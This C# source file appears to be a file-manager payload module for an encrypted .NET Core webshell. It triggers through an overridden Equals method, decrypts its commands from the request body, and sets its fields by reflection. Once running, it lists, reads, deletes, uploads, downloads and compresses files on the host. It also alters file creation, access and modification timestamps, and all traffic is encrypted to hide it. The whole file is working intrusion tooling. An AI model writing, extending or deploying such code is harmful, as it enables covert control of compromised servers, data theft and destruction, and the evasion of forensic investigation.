using System.Security.AccessControl;
using System.Security.Principal;
using System.Globalization;
using System.IO.Compression;
using Microsoft.AspNetCore.Http;
using System.Reflection;
using System.Text;
using System.Security.Cryptography;


public class U
{
    public HttpRequest Request;
    public HttpResponse Response;
    public ISession Session;
    

    public string content;

    public string sessionId;

    

    private DefaultHttpContext context;

    private object current;

    
    public static Dictionary<string, Object> globals;

    public string error_msg;

    public string mode = "list";

    public string path = "d:\\";

    public string newPath = "";
    public string hash;

    
    public static string blockIndex;

    
    public static string blockSize;

    
    public string charset;

    
    public string createTimeStamp;

    
    public string accessTimeStamp;

    
    public string modifyTimeStamp;

    public override bool Equals(Object obj)
    {
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        try
        {
            this.init(obj);
            string text = this.mode;
            switch (text)
            {
                case "list":
                    dictionary.Add("msg", this.list(this.path));
                    break;
                case "show":
                    dictionary.Add("msg", this.base64encode(this.show(this.path)));
                    break;
                case "delete":
                    this.delete(this.path);
                    dictionary.Add("msg", this.path + "删除成功");
                    break;
                case "create":
                    dictionary.Add("msg", this.create(this.mode, this.path, this.content));
                    break;
                case "append":
                    dictionary.Add("msg", this.append(this.mode, this.path, this.content));
                    break;
                case "rename":
                    dictionary.Add("msg", this.rename(this.mode, this.path, this.newPath));
                    break;
                case "createDirectory":
                    dictionary.Add("msg", this.createDirectory(this.path));
                    break;
                case "download":
                    this.Response.ContentType = "application/octet-stream";
                    this.Response.Body.WriteAsync(this.download(this.path));
                    return true;
                case "compress":
                    dictionary.Add("msg", this.compress(this.path));
                    break;
                case "update":
                    this.updateFile();
                    dictionary.Add("msg", "ok");
                    break;
                case "downloadPart":
                    dictionary.Add("msg", this.downloadPart());
                    break;
                case "checkExist":
                    dictionary.Add("msg", this.checkFileExist(this.path));
                    break;
                case "check":
                    dictionary.Add("msg", this.checkFileHash(this.path));
                    break;
                case "getTimeStamp":
                    dictionary.Add("msg", this.getTimeStamp(this.path));
                    break;
                case "updateTimeStamp":
                    dictionary.Add("msg",
                        this.updateTimeStamp(this.path, this.createTimeStamp, this.accessTimeStamp,
                            this.modifyTimeStamp));
                    break;
            }

            dictionary.Add("status", "success");
        }
        catch (Exception ex)
        {
            dictionary.Add("status", "fail");
            dictionary.Add("msg", ex.Message);
        }

        this.Response.Body.WriteAsync(this.EnjsonAndCrypt(dictionary));
        return true;
    }

    public string getTimeStamp(string filePath)
    {
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        FileInfo fileInfo = new FileInfo(filePath);
        dictionary.Add("createTime", fileInfo.CreationTime.ToString());
        dictionary.Add("lastAccessTime", fileInfo.LastAccessTime.ToString());
        dictionary.Add("lastModifiedTime", fileInfo.LastWriteTime.ToString());
        return this.Dict2Json(dictionary);
    }

    
    public string updateTimeStamp(string filePath, string createTimeStamp, string accessTimeStamp,
        string modifyTimeStamp)
    {
        string text = "时间戳修改成功。";
        try
        {
            Dictionary<string, string> dictionary = new Dictionary<string, string>();
            FileInfo fileInfo = new FileInfo(filePath);
            DateTimeFormatInfo dateTimeFormatInfo = new DateTimeFormatInfo();
            dateTimeFormatInfo.ShortDatePattern = "yyyy/MM/dd HH:mm:ss";
            fileInfo.CreationTime = Convert.ToDateTime(createTimeStamp, dateTimeFormatInfo);
            fileInfo.LastAccessTime = Convert.ToDateTime(accessTimeStamp, dateTimeFormatInfo);
            fileInfo.LastWriteTime = Convert.ToDateTime(modifyTimeStamp, dateTimeFormatInfo);
        }
        catch (Exception ex)
        {
            text = ex.Message;
        }

        return text;
    }

    private string checkFileHash(string fileName)
    {
        string text;
        try
        {
            FileStream fileStream = new FileStream(fileName, FileMode.Open);
            MD5 md = new MD5CryptoServiceProvider();
            byte[] array = md.ComputeHash(fileStream);
            fileStream.Close();
            StringBuilder stringBuilder = new StringBuilder();
            for (int i = 0; i < 8; i++)
            {
                stringBuilder.Append(array[i].ToString("x2"));
            }

            text = stringBuilder.ToString();
        }
        catch (Exception ex)
        {
            throw new Exception("GetMD5HashFromFile() fail,error:" + ex.Message);
        }

        return text;
    }

    private static void CompressDirectory(string sInDir, string sOutFile)
    {
        string[] files = Directory.GetFiles(sInDir, "*.*", SearchOption.AllDirectories);
        int num = ((sInDir[sInDir.Length - 1] == Path.DirectorySeparatorChar) ? sInDir.Length : (sInDir.Length + 1));
        using (FileStream fileStream = new FileStream(sOutFile, FileMode.Create, FileAccess.Write, FileShare.None))
        {
            using (GZipStream gzipStream = new GZipStream(fileStream, CompressionMode.Compress))
            {
                foreach (string text in files)
                {
                    string text2 = text.Substring(num);
                    U.CompressFile(sInDir, text2, gzipStream);
                }
            }
        }
    }

    private static void CompressFile(string sDir, string sRelativePath, GZipStream zipStream)
    {
        char[] array = sRelativePath.ToCharArray();
        zipStream.Write(BitConverter.GetBytes(array.Length), 0, 4);
        foreach (char c in array)
        {
            zipStream.Write(BitConverter.GetBytes(c), 0, 2);
        }

        byte[] array3 = File.ReadAllBytes(Path.Combine(sDir, sRelativePath));
        zipStream.Write(BitConverter.GetBytes(array3.Length), 0, 4);
        zipStream.Write(array3, 0, array3.Length);
    }

    private void updateFile()
    {
        FileStream fileStream = new FileStream(this.path, FileMode.OpenOrCreate, FileAccess.Write, FileShare.ReadWrite);
        byte[] array = Convert.FromBase64String(this.content);
        fileStream.Seek((long)(int.Parse(U.blockIndex) * int.Parse(U.blockSize)), SeekOrigin.Current);
        fileStream.Write(array, 0, array.Length);
        fileStream.Flush();
        fileStream.Close();
    }

    
    private string downloadPart()
    {
        byte[] array = new byte[int.Parse(U.blockSize)];
        FileStream fileStream = new FileStream(this.path, FileMode.Open, FileAccess.Read, FileShare.Read);
        fileStream.Seek((long)(int.Parse(U.blockIndex) * int.Parse(U.blockSize)), SeekOrigin.Current);
        int num = fileStream.Read(array, 0, int.Parse(U.blockSize));
        fileStream.Close();
        return Convert.ToBase64String(array, 0, num);
    }

    
    private string compress(string path)
    {
        if (path.EndsWith("/"))
        {
            path = path.Remove(path.Length - 1);
        }

        DirectoryInfo directoryInfo = new DirectoryInfo(path);
        string text = string.Concat(new object[]
        {
            directoryInfo.Parent.FullName,
            Path.DirectorySeparatorChar,
            directoryInfo.Name,
            ".gzip"
        });
        U.CompressDirectory(path, text);
        return "OK";
    }

    
    private string checkFileExist(string path)
    {
        if (File.Exists(path))
        {
            return "OK";
        }

        throw new Exception("error");
    }

    
    private static string getFilePerm(string path)
    {
        string text4;
        try
        {
            string text = "-";
            string text2 = "-";
            string text3 = "-";
            WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent();
            WindowsPrincipal windowsPrincipal = new WindowsPrincipal(windowsIdentity);
            FileSecurity accessControl = new FileInfo(path).GetAccessControl();
            if (accessControl == null)
            {
                text4 = "-/-/-";
            }
            else
            {
                AuthorizationRuleCollection accessRules = accessControl.GetAccessRules(true, true, typeof(NTAccount));
                if (accessRules == null)
                {
                    text4 = "-/-/-";
                }
                else
                {
                    foreach (object obj in accessRules)
                    {
                        FileSystemAccessRule fileSystemAccessRule = (FileSystemAccessRule)obj;
                        NTAccount ntaccount = fileSystemAccessRule.IdentityReference as NTAccount;
                        if (!(ntaccount == null) && windowsPrincipal.IsInRole(ntaccount.Value))
                        {
                            if ((FileSystemRights.Read & fileSystemAccessRule.FileSystemRights) ==
                                FileSystemRights.Read &&
                                fileSystemAccessRule.AccessControlType == AccessControlType.Allow)
                            {
                                text = "R";
                            }

                            if ((FileSystemRights.Write & fileSystemAccessRule.FileSystemRights) ==
                                FileSystemRights.Write &&
                                fileSystemAccessRule.AccessControlType == AccessControlType.Allow)
                            {
                                text2 = "W";
                            }

                            if ((FileSystemRights.ExecuteFile & fileSystemAccessRule.FileSystemRights) ==
                                FileSystemRights.ExecuteFile &&
                                fileSystemAccessRule.AccessControlType == AccessControlType.Allow)
                            {
                                text3 = "E";
                            }
                        }
                    }

                    if (File.GetAttributes(path).ToString().ToLower()
                            .IndexOf("readonly") >= 0)
                    {
                        text2 = "-";
                    }

                    text4 = string.Concat(new string[] { text, "/", text2, "/", text3 });
                }
            }
        }
        catch (Exception)
        {
            text4 = "";
        }

        return text4;
    }

    public string list(string path)
    {
        DirectoryInfo directoryInfo = new DirectoryInfo(path);
        FileInfo[] files = directoryInfo.GetFiles();
        DirectoryInfo[] directories = directoryInfo.GetDirectories();
        List<Dictionary<string, string>> list = new List<Dictionary<string, string>>();
        list.Add(new Dictionary<string, string>
        {
            {
                "name",
                Convert.ToBase64String(Encoding.UTF8.GetBytes("."))
            },
            {
                "type",
                Convert.ToBase64String(Encoding.UTF8.GetBytes("directory"))
            },
            {
                "size",
                Convert.ToBase64String(Encoding.UTF8.GetBytes("4096"))
            },
            {
                "perm",
                Convert.ToBase64String(Encoding.UTF8.GetBytes(U.getFilePerm(directoryInfo.FullName)))
            },
            {
                "lastModified",
                Convert.ToBase64String(Encoding.UTF8.GetBytes(directoryInfo.LastWriteTime.ToString()))
            }
        });
        if (directoryInfo.Parent != null)
        {
            list.Add(new Dictionary<string, string>
            {
                {
                    "name",
                    Convert.ToBase64String(Encoding.UTF8.GetBytes(".."))
                },
                {
                    "type",
                    Convert.ToBase64String(Encoding.UTF8.GetBytes("directory"))
                },
                {
                    "size",
                    Convert.ToBase64String(Encoding.UTF8.GetBytes("4096"))
                },
                {
                    "perm",
                    Convert.ToBase64String(Encoding.UTF8.GetBytes(U.getFilePerm(directoryInfo.Parent.FullName)))
                },
                {
                    "lastModified",
                    Convert.ToBase64String(Encoding.UTF8.GetBytes(directoryInfo.Parent.LastWriteTime.ToString()))
                }
            });
        }

        DirectoryInfo[] array = directories;
        DirectoryInfo[] array2 = array;
        foreach (DirectoryInfo directoryInfo2 in array2)
        {
            list.Add(this.warpDirectoryObj(directoryInfo2));
        }

        FileInfo[] array4 = files;
        FileInfo[] array5 = array4;
        foreach (FileInfo fileInfo in array5)
        {
            list.Add(new Dictionary<string, string>
            {
                {
                    "name",
                    Convert.ToBase64String(Encoding.UTF8.GetBytes(fileInfo.Name))
                },
                {
                    "type",
                    Convert.ToBase64String(Encoding.UTF8.GetBytes("file"))
                },
                {
                    "size",
                    Convert.ToBase64String(Encoding.UTF8.GetBytes(fileInfo.Length + ""))
                },
                {
                    "perm",
                    Convert.ToBase64String(Encoding.UTF8.GetBytes(U.getFilePerm(fileInfo.FullName)))
                },
                {
                    "lastModified",
                    Convert.ToBase64String(Encoding.UTF8.GetBytes(fileInfo.LastWriteTime.ToString()))
                }
            });
        }

        return this.DictList2Json(list);
    }


    private Dictionary<string, string> warpDirectoryObj(DirectoryInfo d)
    {
        return new Dictionary<string, string>
        {
            {
                "name",
                Convert.ToBase64String(Encoding.UTF8.GetBytes(d.Name))
            },
            {
                "type",
                Convert.ToBase64String(Encoding.UTF8.GetBytes("directory"))
            },
            {
                "size",
                Convert.ToBase64String(Encoding.UTF8.GetBytes("4096"))
            },
            {
                "perm",
                Convert.ToBase64String(Encoding.UTF8.GetBytes(U.getFilePerm(d.FullName)))
            },
            {
                "lastModified",
                Convert.ToBase64String(Encoding.UTF8.GetBytes(d.LastWriteTime.ToString()))
            }
        };
    }

    private string DictList2Json(List<Dictionary<string, string>> list)
    {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append("[");
        foreach (Dictionary<string, string> dictionary in list)
        {
            stringBuilder.Append("{");
            foreach (string text in dictionary.Keys)
            {
                stringBuilder.Append("\"" + text + "\":\"");
                stringBuilder.Append(dictionary[text] + "\",");
            }

            stringBuilder.Remove(stringBuilder.Length - 1, 1);
            stringBuilder.Append("},");
        }

        if (stringBuilder.ToString().EndsWith(","))
        {
            stringBuilder.Remove(stringBuilder.Length - 1, 1);
        }

        stringBuilder.Append("]");
        return stringBuilder.ToString();
    }

    private string base64encode(string content)
    {
        Encoding encoding = Encoding.GetEncoding("ISO-8859-1");
        if (this.charset != null)
        {
            encoding = Encoding.GetEncoding(this.charset);
        }

        return Convert.ToBase64String(encoding.GetBytes(content));
    }

    public string show(string filePath)
    {
        string text;
        if (this.charset == null)
        {
            text = File.ReadAllText(filePath);
        }
        else
        {
            text = File.ReadAllText(filePath, Encoding.GetEncoding(this.charset));
        }

        return text;
    }

    public bool delete(string path)
    {
        FileAttributes attributes = File.GetAttributes(path);
        if (attributes == FileAttributes.Directory)
        {
            Directory.Delete(path, true);
        }
        else
        {
            File.Delete(path);
        }

        return true;
    }

    private string create(string mode, string path, string content)
    {
        FileStream fileStream = new FileStream(path, FileMode.Create);
        byte[] array = Convert.FromBase64String(content);
        fileStream.Write(array, 0, array.Length);
        fileStream.Flush();
        fileStream.Close();
        return path + "上传完成，远程文件大小:" + new FileInfo(path).Length;
    }

    
    private string createDirectory(string path)
    {
        string text;
        if (Directory.Exists(path))
        {
            text = "创建失败，目录已存在。";
        }
        else
        {
            Directory.CreateDirectory(path);
            text = "目录创建完成。";
        }

        return text;
    }

    
    private string append(string mode, string path, string content)
    {
        FileStream fileStream = new FileStream(path, FileMode.Append);
        byte[] array = Convert.FromBase64String(content);
        fileStream.Write(array, 0, array.Length);
        fileStream.Flush();
        fileStream.Close();
        return path + "追加完成，远程文件大小:" + new FileInfo(path).Length;
    }

    
    private string rename(string mode, string path, string newPath)
    {
        FileInfo fileInfo = new FileInfo(path);
        fileInfo.MoveTo(newPath);
        return path + "重命名完成：" + newPath;
    }

    
    private bool upload(string path, string content)
    {
        FileStream fileStream = new FileStream(path, FileMode.Create);
        byte[] array = Convert.FromBase64String(content);
        fileStream.Write(array, 0, array.Length);
        fileStream.Flush();
        fileStream.Close();
        return true;
    }

    
    private byte[] download(string path)
    {
        FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read);
        byte[] array = ((fileStream.Length != 0L) ? new byte[fileStream.Length] : new byte[1]);
        fileStream.Read(array, 0, array.Length);
        fileStream.Close();
        return array;
    }

    private byte[] EnjsonAndCrypt(Dictionary<string, string> result)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(this.Dict2Json(result));
        return this.Encrypt(bytes);
    }

    private string Dict2Json(Dictionary<string, string> dict)
    {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append("{");
        foreach (string text in dict.Keys)
        {
            stringBuilder.Append("\"" + text + "\":\"");
            stringBuilder.Append(Convert.ToBase64String(Encoding.UTF8.GetBytes(dict[text])) + "\",");
        }

        if (stringBuilder.ToString().EndsWith(","))
        {
            stringBuilder.Remove(stringBuilder.Length - 1, 1);
        }

        stringBuilder.Append("},");
        stringBuilder.Remove(stringBuilder.Length - 1, 1);
        return stringBuilder.ToString();
    }

    private void init(object obj)
    {
        /*
         * .net core中重构体系，所以HttpContext.Current不存在类似的
         */
        this.current = obj;
        this.fillRequestHandler(obj);
        this.fillSessionHandler();
        this.fillParams();

        
        
        
        
        
        
        
        
        
        
        
        
        
        
    }


    private void fillRequestHandler(object obj)
    {
        this.context = (DefaultHttpContext)obj;
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8"; 
    }

    private void fillSessionHandler()
    {
        try
        {
            
            this.Session = ((HttpContext)this.context).Session;
            
            this.Session.Set("test", Encoding.UTF8.GetBytes("test"));
            
            if (!globals.ContainsKey(this.Session.Id))
            {
                if (globals != null)
                {
                    globals[this.Session.Id] = new Dictionary<string, object>();
                }
            }
        }
        catch (Exception ex)
        {
            
            

            
            
            
            
            
            
            if (this.sessionId != null)
            {
                if (!globals.ContainsKey(this.sessionId))
                {
                    if (globals != null)
                    {
                        globals[this.sessionId] = new Dictionary<string, object>();
                    }
                }
            }
            else
            {
                error_msg = ex.Message;
            }
        }
    }

    private void fillParams()
    {
        using (var memoryStream = new MemoryStream())
        {
            
            context.Request.Body.Seek(0, SeekOrigin.Begin);
            context.Request.Body.CopyTo(memoryStream);

            
            memoryStream.Seek(0, SeekOrigin.Begin);

            
            byte[] array = memoryStream.ToArray();

            
            array = Decrypt(array);

            
            Dictionary<string, string> extraData = getExtraData(array);

            
            if (extraData != null)
            {
                foreach (var key in extraData.Keys)
                {
                    var field = this.GetType().GetField(key);
                    if (field != null)
                    {
                        field.SetValue(this, extraData[key]);
                    }
                }
            }
        }
    }

    private byte[] Encrypt(byte[] data)
    {
        var EncryptFunc = ((DefaultHttpContext)current).Items["EncryptFunc"];
        MethodInfo method = (MethodInfo)EncryptFunc.GetType().GetProperty("Method").GetValue(EncryptFunc);

        
        
        byte[] array;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            array = new RijndaelManaged().CreateEncryptor(bytes, bytes).TransformFinalBlock(data, 0, data.Length);
        }
        else
        {
            
            
            array = (byte[])method.Invoke(null, new object[] { data });
        }

        return array;
    }

    private byte[] Decrypt(byte[] data)
    {
        
        var DecryptFunc = ((DefaultHttpContext)current).Items["DecryptFunc"];
        MethodInfo method = (MethodInfo)DecryptFunc.GetType().GetProperty("Method").GetValue(DecryptFunc);

        byte[] result;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            using (Aes aesAlg = Aes.Create()) 
            {
                aesAlg.Key = bytes; 
                aesAlg.IV = bytes; 

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV); 
                result = decryptor.TransformFinalBlock(data, 0, data.Length); 
            }
        }
        else
        {
            
            
            result = (byte[])method.Invoke(null, new object[] { data });
        }

        return result;
    }

    private Dictionary<string, string> getExtraData(byte[] fullData)
    {
        this.context.Request.Body.Seek(0, SeekOrigin.Begin);
        int num = this.IndexOf(fullData, new byte[]
        {
            126,
            126,
            126,
            126,
            126,
            126
        });
        byte[] bytes = new List<byte>(fullData).GetRange(num + 6, fullData.Length - num - 6).ToArray();
        string @string = Encoding.Default.GetString(bytes);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        string[] array = @string.Split(new char[]
        {
            ','
        });
        foreach (string text in array)
        {
            string[] array3 = text.Split(new char[]
            {
                ':'
            });
            if (array3.Length == 2)
            {
                string key = array3[0];
                string string2 = Encoding.UTF8.GetString(Convert.FromBase64String(array3[1]));
                dictionary.Add(key, string2);
            }
        }

        return dictionary;
    }


    internal int IndexOf(byte[] srcBytes, byte[] searchBytes)
    {
        int num = 0;
        int result;
        if (srcBytes == null)
        {
            result = -1;
        }
        else if (searchBytes == null)
        {
            result = -1;
        }
        else if (srcBytes.Length == 0)
        {
            result = -1;
        }
        else if (searchBytes.Length == 0)
        {
            result = -1;
        }
        else if (srcBytes.Length < searchBytes.Length)
        {
            result = -1;
        }
        else
        {
            for (int i = 0; i < srcBytes.Length - searchBytes.Length; i++)
            {
                if (srcBytes[i] == searchBytes[0])
                {
                    if (searchBytes.Length == 1)
                    {
                        return i;
                    }

                    bool flag = true;
                    for (int j = 1; j < searchBytes.Length; j++)
                    {
                        if (srcBytes[i + j] != searchBytes[j])
                        {
                            flag = false;
                            break;
                        }
                    }

                    if (flag)
                    {
                        num++;
                        if (num == 2)
                        {
                            return i;
                        }
                    }
                }
            }

            result = -1;
        }

        return result;
    }

    private void fillRequest(object obj)
    {
        
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8"; 
    }

    private void fillSession()
    {
        try
        {
            this.Session = this.context.Session;
        }
        catch (Exception)
        {
            
            if (!context.Items.ContainsKey(this.context.Session.Id) ||
                this.context.Items[this.context.Session.Id] == null) 
            {
                this.context.Items[this.context.Session.Id] = new Dictionary<string, object>();
            }
        }
    }
}